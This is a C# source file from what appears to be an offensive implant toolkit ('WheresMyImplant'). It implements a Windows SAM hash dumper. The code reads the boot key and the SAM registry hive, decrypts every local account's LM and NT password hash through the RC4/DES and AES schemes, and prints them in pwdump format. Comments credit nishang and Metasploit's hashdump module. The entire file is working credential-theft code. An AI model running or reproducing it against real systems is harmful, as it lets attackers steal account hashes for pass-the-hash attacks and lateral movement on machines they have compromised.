using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

using MonkeyWorks;
using MonkeyWorks.Unmanaged.Libraries;

namespace WheresMyImplant
{
    class SAM : Base
    {
        private static Byte[] lmPass = Encoding.ASCII.GetBytes("LMPASSWORD\0");
        private static Byte[] ntPass = Encoding.ASCII.GetBytes("NTPASSWORD\0");
        private static Byte[] qwerty = Encoding.ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0");
        private static Byte[] numeric = Encoding.ASCII.GetBytes("0123456789012345678901234567890123456789\0");

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal SAM()
        {
            Byte[] bootKey = LSASecrets.GetBootKey();
            Console.WriteLine("[+] BootKey: {0}", System.BitConverter.ToString(bootKey).Replace("-",""));
            Byte[] hBootKey = GetHBootKey(bootKey);
            Console.WriteLine("[+] HBootKey: {0}", System.BitConverter.ToString(hBootKey).Replace("-", ""));
            UserKeys[] userKeys = GetUserHashes(hBootKey);
            DecryptUserHashes(ref userKeys, hBootKey);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal static Byte[] GetHBootKey(Byte[] bootKey)
        {
            Byte[] F = (Byte[])Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains\Account").GetValue("F");
            Int32 hashVersion = BitConverter.ToInt32(F.Skip(0x68).Take(4).ToArray(), 0);
            switch (hashVersion)
            {
                case 1:
                    using (MD5 md5 = new MD5CryptoServiceProvider())
                    {
                        Byte[] compute = new Byte[0];
                        compute = Combine.combine(compute, F.Skip(0x70).Take(0x10).ToArray());
                        compute = Combine.combine(compute, qwerty);
                        compute = Combine.combine(compute, bootKey);
                        compute = Combine.combine(compute, numeric);
                        Byte[] rc4Key = md5.ComputeHash(compute);
                        return Misc.RC4Encrypt(rc4Key, F.Skip(0x80).Take(0x20).ToArray());
                    }
                case 2:
                    using (Aes aes = new AesCryptoServiceProvider())
                    {
                        aes.Key = bootKey;
                        aes.Padding = PaddingMode.Zeros;
                        aes.IV = F.Skip(0x78).Take(16).ToArray();
                        aes.Mode = CipherMode.CBC;
                        ICryptoTransform decryptor = aes.CreateDecryptor();
                        return decryptor.TransformFinalBlock(F, 0x88, 16);
                    }
                default:
                    return new Byte[0];
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal struct UserKeys
        {
            internal String userName;
            internal Int32 rid;
            internal Byte[] v;
            internal Byte[] f;
            internal Byte[] userPasswordHint;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal UserKeys[] GetUserHashes(Byte[] hBootKey)
        {
            int size = 0;
            UIntPtr hKey = new UIntPtr();
            Int32 type = 0;
            Dictionary <Int32, String> ridMapping = new Dictionary<Int32, String>();
            String[] namesSubKeys = Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains\Account\Users\Names").GetSubKeyNames();
            foreach (String name in namesSubKeys)
            {
                if (advapi32.RegOpenKeyEx(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\Names\" + name, 0, Reg.KEY_QUERY_VALUE, out hKey) != 0)
                {
                    Console.WriteLine("[-] Error opening key '{0}\\{1}", @"SAM\SAM\Domains\Account\Users\Names\" + name, "");
                    return null;
                }
                if (advapi32.RegQueryValueEx(hKey, "", 0, ref type, IntPtr.Zero, ref size) != 0)
                {
                    Console.WriteLine("[-] [-] Error querying value '{0}\\{1}", @"SAM\SAM\Domains\Account\Users\Names\" + name, "");
                    return null;
                }
                ridMapping[type] = name;
            }

            String[] secretSubKeys = Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains\Account\Users").GetSubKeyNames();
            UserKeys[] userKeys = new UserKeys[secretSubKeys.Length - 1];
            for (Int32 i = 0; i < secretSubKeys.Length; i++)
            {
                if (secretSubKeys[i] != "Names")
                {
                    userKeys[i].rid = Int32.Parse(secretSubKeys[i], System.Globalization.NumberStyles.HexNumber);
                    userKeys[i].userName = ridMapping[userKeys[i].rid];
                    userKeys[i].f = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\" + secretSubKeys[i], "F");
                    userKeys[i].v = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\" + secretSubKeys[i], "V");
                    userKeys[i].userPasswordHint = (Byte[])Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains\Account\Users\" + secretSubKeys[i]).GetValue("UserPasswordHint");
                    //userKeys[i].userPasswordHint = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SAM\SAM\Domains\Account\Users\" + secretSubKeys[i], "UserPasswordHint");
                }
            }
            return userKeys;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void DecryptUserHashes(ref UserKeys[] userKeys, Byte[] hBootKey)
        {
            Console.WriteLine("");
            foreach (UserKeys userKey in userKeys)
            {
                Byte[] lmHashArray = { 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee};
                String lmHash = "aad3b435b51404eeaad3b435b51404ee";
                Byte[] ntHashArray = { 0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0};
                String ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";

                Int32 offset = BitConverter.ToInt32(userKey.v.Skip(0x9c).Take(4).ToArray(), 0) + 0xCC;
                Int32 length = BitConverter.ToInt32(userKey.v.Skip(0xa0).Take(4).ToArray(), 0);
                Byte[] encryptedLmHash = userKey.v.Skip(offset).Take(length).ToArray();
                lmHash = BitConverter.ToString(Decrypt(encryptedLmHash, userKey.rid, hBootKey, lmPass, lmHashArray)).Replace("-", "");

                offset = BitConverter.ToInt32(userKey.v.Skip(0xa8).Take(4).ToArray(), 0) + 0xCC;
                length = BitConverter.ToInt32(userKey.v.Skip(0xac).Take(4).ToArray(), 0);
                Byte[] encryptedNtHash = userKey.v.Skip(offset).Take(length).ToArray();
                ntHash = BitConverter.ToString(Decrypt(encryptedNtHash, userKey.rid, hBootKey, ntPass, ntHashArray)).Replace("-", "");

                String pwFormat = String.Format("{0}:{1}:{2}:{3}:::", userKey.userName, userKey.rid, lmHash.ToLower(), ntHash.ToLower());
                Console.WriteLine(pwFormat);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static Byte[] Decrypt(Byte[] encryptedHash, Int32 rid, Byte[] hBootKey, Byte[] hashType, Byte[] blankHash)
        {
            try
            {
                switch (BitConverter.ToInt16(encryptedHash.Skip(2).Take(2).ToArray(), 0))
                {
                    case 1:
                        return DecryptSingleHashRC4(encryptedHash, rid, hBootKey, hashType, blankHash);
                    case 2:
                        return DecryptSingleHashAES(encryptedHash, rid, hBootKey, hashType, blankHash);
                    default:
                        return blankHash;
                }
            }
            catch (Exception)
            {
                return blankHash;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Used for Windows 7(?) and prior
        // https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
        ////////////////////////////////////////////////////////////////////////////////
        private static Byte[] DecryptSingleHashRC4(Byte[] encryptedHash, Int32 rid, Byte[] hBootKey, Byte[] hashType, Byte[] blankHash)
        {
            if (encryptedHash.Length < 20)
            {
                return blankHash;
            }

            Int32[][] desKeys = ConvertRidToDesKey(rid);
            Byte[] rc4DecryptedHash;
            using (MD5 md5 = new MD5CryptoServiceProvider())
            {               
                Byte[] combined = Combine.combine(Combine.combine(hBootKey.Take(16).ToArray(), BitConverter.GetBytes(rid)), hashType);

                Byte[] hash = md5.ComputeHash(combined);
                rc4DecryptedHash = Misc.RC4Encrypt(hash, encryptedHash);
            }
            Byte[] desDecryptedHash1 = DecryptDes(rc4DecryptedHash.Take(8).ToArray(), desKeys[0]);
            Byte[] desDecryptedHash2 = DecryptDes(rc4DecryptedHash.Skip(8).Take(8).ToArray(), desKeys[1]);
            return Combine.combine(desDecryptedHash1, desDecryptedHash2);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Added compatibility for newer versions of windows
        // https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/hashdump.rb
        ////////////////////////////////////////////////////////////////////////////////
        private static Byte[] DecryptSingleHashAES(Byte[] encryptedHash, Int32 rid, Byte[] hBootKey, Byte[] hashType, Byte[] blankHash)
        {
            if (encryptedHash.Length < 40)
            {
                return blankHash;
            }

            Int32[][] desKeys = ConvertRidToDesKey(rid);
            Byte[] aesDecryptedHash;
            using (Aes aes = new AesCryptoServiceProvider())
            {
                aes.Key = hBootKey.Take(16).ToArray();
                aes.Padding = PaddingMode.Zeros;
                aes.IV = encryptedHash.Skip(8).Take(16).ToArray();
                aes.Mode = CipherMode.CBC;
                ICryptoTransform decryptor = aes.CreateDecryptor();
                aesDecryptedHash = decryptor.TransformFinalBlock(encryptedHash, 24, 16);
            }
            Byte[] desDecryptedHash1 = DecryptDes(aesDecryptedHash.Take(8).ToArray(), desKeys[0]);
            Byte[] desDecryptedHash2 = DecryptDes(aesDecryptedHash.Skip(8).Take(8).ToArray(), desKeys[1]);
            return Combine.combine(desDecryptedHash1, desDecryptedHash2);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // 
        ////////////////////////////////////////////////////////////////////////////////
        private static Byte[] DecryptDes(Byte[] encrytped, Int32[] key)
        {
            Byte[] desKey = new Byte[key.Length];
            for (Int32 i = 0; i < key.Length; i++)
            {
                desKey[i] = Convert.ToByte(key[i]);
            }

            Byte[] desDecryptedHash;
            using (DESCryptoServiceProvider des = new DESCryptoServiceProvider())
            {
                des.Mode = CipherMode.ECB;
                des.Padding = PaddingMode.None;
                des.Key = desKey;
                des.IV = desKey;
                ICryptoTransform desDecryptor = des.CreateDecryptor();
                desDecryptedHash = desDecryptor.TransformFinalBlock(encrytped, 0, 8);
            }
            return desDecryptedHash;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //Good
        //https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
        ////////////////////////////////////////////////////////////////////////////////
        private static Int32[][] ConvertRidToDesKey(Int32 rid)
        {
            Byte b0 = Convert.ToByte(rid & 255);
            Byte b1 = Convert.ToByte((rid & 65280) / 256);
            Byte b2 = Convert.ToByte((rid & 16711680) / 65536);
            Byte b3 = Convert.ToByte((rid & 4278190080) / 16777216);

            //Byte[] desKey1 = new Byte[0];
            Byte[] desKey1 = { b0, b1, b2, b3, b0, b1, b2 };
            Byte[] desKey2 = { b3, b0, b1, b2, b3, b0, b1 };
            Int32[][] keys = { ConvertRidToDesKey2(desKey1), ConvertRidToDesKey2(desKey2) };
            return keys;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
        ////////////////////////////////////////////////////////////////////////////////
        private static Int32[] ConvertRidToDesKey2(Byte[] key)
        {
            Int32 k0 = (Int32)Math.Floor(key[0] * .5);
            Int32 k1 = (key[0] & 0x01) * 64 | (Int32)Math.Floor(key[1] * .25);
            Int32 k2 = (key[1] & 0x03) * 32 | (Int32)Math.Floor(key[2] * .125);
            Int32 k3 = (key[2] & 0x07) * 16 | (Int32)Math.Floor(key[3] * .0625);
            Int32 k4 = (key[3] & 0x0F) * 8  | (Int32)Math.Floor(key[4] * .03125);
            Int32 k5 = (key[4] & 0x1F) * 4  | (Int32)Math.Floor(key[5] * .015625);
            Int32 k6 = (key[5] & 0x3F) * 2  | (Int32)Math.Floor(key[6] * .0078125);
            Int32 k7 = (key[6] & 0x7F);
            Int32[] key2 = { k0, k1, k2, k3, k4, k5, k6, k7 };

            Int16[] oddParity = {
                1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
                16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
                32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
                49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
                64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
                81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
                97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
                112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
                128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
                145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
                161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
                176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
                193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
                208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
                224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
                241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
                                };

            for (Int32 i = 0; i < 8; i++)
            {
                key2[i] = oddParity[key2[i] * 2];
            }
            return key2;
        }
    }
}